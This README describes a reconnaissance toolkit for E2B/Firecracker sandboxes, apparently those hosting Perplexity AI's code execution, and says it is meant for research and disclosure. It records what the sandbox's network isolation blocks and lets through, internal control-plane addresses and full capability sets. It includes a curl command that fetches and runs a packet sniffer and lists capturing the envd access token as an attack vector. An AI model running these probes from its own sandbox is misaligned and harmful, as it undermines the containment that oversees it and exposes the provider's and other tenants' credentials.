# E2B Sandbox Infrastructure Fingerprinting

**Passive reconnaissance toolkit for E2B/Firecracker infrastructure**

⚠️ **UPDATE (2026-02-28):** External beacon approach blocked by E2B network isolation. See [Network Analysis](NETWORK_ANALYSIS.md) for AF_PACKET capture results.

---

## Components

### Original Design (External Echo)
1. **http_echo_server.py** - VPS echo server (port 8080)
2. **https_echo_server.py** - HTTPS variant with TLS fingerprinting (port 8443)
3. **fingerprint_beacon.py** - E2B sandbox beacon script

### Actual Reality (Internal Capture)
- **AF_PACKET sniffer** - Capture internal VPC traffic (10.x.x.x)
- **Internal fingerprinting** - Kernel, CPU, process analysis
- **Control plane discovery** - 10.12.88.220 monitoring endpoint

---

## Network Isolation Findings

### What Works ✅
- **TCP handshake** to whitelisted IPs (3.66.226.62:443 @ 0.3ms RTT)
- **Internal VPC traffic** visible via AF_PACKET (10.12.88.220)
- **envd monitoring** endpoints (GET /metrics, GET /health)
- **CAP_NET_RAW** capability available for packet capture

### What's Blocked ❌
- **DNS resolution** (despite 8.8.8.8 in /etc/resolv.conf)
- **HTTP/HTTPS data** to external IPs (DPI firewall)
- **External echo servers** (beacon approach infeasible)
- **General internet egress** (whitelist-only)

### Architecture Confirmed
```
E2B Sandbox (169.254.0.21/30)
  ↓ virtio-net
Host Firewall (TAP device)
  ├─ Allow: TCP SYN to whitelist
  ├─ Drop: Non-ConnectRPC data
  └─ Forward: Internal VPC (10.x.x.x)
```

**Key Discovery:** `10.12.88.220` control plane sends plain HTTP monitoring requests to envd (:49983) — visible via AF_PACKET!

See [NETWORK_ANALYSIS.md](NETWORK_ANALYSIS.md) for detailed packet capture results.

---

## Quick Start (Updated)

### External Beacon (Doesn't Work)
~~The original design assumed external connectivity, but E2B blocks DNS and HTTP/HTTPS to non-whitelisted IPs.~~

### Internal Fingerprinting (Works)

**Deploy AF_PACKET Sniffer:**
```bash
# In E2B sandbox
curl -sL https://raw.githubusercontent.com/pv-udpv/pplx-e2b-re/main/spawned_procs/af_packet_sniffer.py -o sniffer.py
mkdir -p ~/workspace/logs
python3 sniffer.py &

# Query captured traffic
sqlite3 ~/workspace/logs/traffic.db 'SELECT * FROM packets WHERE interesting=1'
```

**Internal Fingerprint Collection:**
```python
import os, socket, subprocess

fingerprint = {
    'sandbox_id': os.environ.get('E2B_SANDBOX_ID'),
    'hostname': socket.gethostname(),
    'kernel': open('/proc/version').read().strip()[:80],
    'network': {
        'eth0': '169.254.0.21/30',
        'gateway': '169.254.0.22'
    },
    'processes': {
        'envd': subprocess.check_output(['pgrep', '-f', 'envd']).decode().strip(),
        'jupyter': subprocess.check_output(['pgrep', '-f', 'jupyter']).decode().strip()
    }
}

print(f"Sandbox: {fingerprint['sandbox_id']}")
print(f"Kernel: {fingerprint['kernel']}")
```

**Example Output:**
```
Sandbox: ixp59jqwqr8f8gnyt5ic2
Kernel: Linux version 6.1.158 (root@runnervmfxdz0) (gcc 11.4.0)
Hostname: e2b.local
CPU: Intel(R) Xeon(R) Processor @ 2.60GHz (2 cores)
Memory: 984 MB
```

---

## Attack Vectors (Updated)

### Original (External NAT)
~~- Host Co-location Detection - Same NAT IP = same host~~  
~~- Infrastructure Mapping - Enumerate AWS regions via NAT IPs~~

### Actual (Internal Monitoring)
- **Control Plane Discovery** - 10.12.88.220 identified from packet capture
- **Kernel Build Host** - `runnervmfxdz0` from `/proc/version` (infrastructure fingerprint)
- **envd Monitoring Endpoints** - GET /metrics, GET /health (plain HTTP, no auth)
- **Token Extraction** - AF_PACKET can capture `e2b-envd-access-token` during file ops
- **Timing Analysis** - 0.3ms RTT to E2B backends suggests same AWS AZ

---

## Security Implications

⚠️ **For E2B:**
- **Control plane IP exposed** (10.12.88.220 visible in packet capture)
- **Internal monitoring uses plain HTTP** (performance vs security trade-off)
- **Partial network isolation** (VPC traffic visible, external blocked)
- **Deterministic infrastructure** (same kernel build, envd PID 347, CPU model)

✅ **For Disclosure:**
- **Advanced reconnaissance** beyond simple egress testing
- **Internal architecture mapping** (control plane, monitoring, tokens)
- **Multi-tenant isolation** concerns if same control plane serves all sandboxes
- **Actionable hardening:** Encrypt internal monitoring, randomize infrastructure

---

## Architecture

### Confirmed Components
- **envd** (PID 347) - Go agent, gRPC :49983, HTTP monitoring endpoints
- **FastAPI** (PID 545) - Control plane :49999
- **Jupyter** (PID 413) - 5 processes, :8888
- **Control Plane** - 10.12.88.220 (AWS VPC private)

### Network Stack
- **Guest IP:** 169.254.0.21/30 (link-local)
- **Gateway:** 169.254.0.22 (virtio-net → TAP)
- **DNS:** 8.8.8.8 (configured but resolution blocked)
- **Firewall:** Host-side iptables/nftables (whitelist + DPI)

### Capability Set
- **CAP_NET_RAW:** ✅ Available (AF_PACKET works)
- **CAP_SYS_ADMIN:** ✅ Available (prior RE confirmed)
- **All 41 capabilities:** ✅ (CapEff: 000001ffffffffff)

---

## Limitations

### External Beacon (Original Design)
- ❌ DNS resolution blocked
- ❌ HTTP/HTTPS to arbitrary IPs dropped
- ❌ NAT IP invisible (host firewall hides post-NAT traffic)
- ❌ Cannot reach VPS echo servers

### AF_PACKET Capture (Actual Method)
- ✅ Internal VPC traffic (10.x.x.x) visible
- ✅ envd/FastAPI plain HTTP captured
- ❌ External traffic (3.66.x.x) invisible (host filtering)
- ❌ TLS payloads encrypted (even if captured)
- ❌ Other sandboxes' traffic isolated

---

## Responsible Use

For security research and coordinated disclosure only.

**DO NOT:**
- Attack production infrastructure
- Exfiltrate customer data
- Perform DoS attacks

**Recommended:**
- Security research in isolated environments
- Red team exercises (with authorization)
- Coordinated vulnerability disclosure

---

## References

- **Network Analysis:** [NETWORK_ANALYSIS.md](NETWORK_ANALYSIS.md) - Packet capture results
- **AF_PACKET Sniffer:** [pplx-e2b-re](https://github.com/pv-udpv/pplx-e2b-re/blob/main/spawned_procs/af_packet_sniffer.py)
- **Bootstrap Script:** [pplx-e2b-re/bootstrap.sh](https://github.com/pv-udpv/pplx-e2b-re/blob/main/bootstrap.sh)
- **Prior RE Report:** [E2B Comprehensive Analysis](https://github.com/pv-udpv/pplx-e2b-re)

---

## Credits

**Research:** [@pv-udpv](https://github.com/pv-udpv)  
**Date:** February 2026  
**Stack:** Python 3.12, AF_PACKET, SQLite, Firecracker MicroVM  
**Sandbox:** Perplexity AI E2B Infrastructure
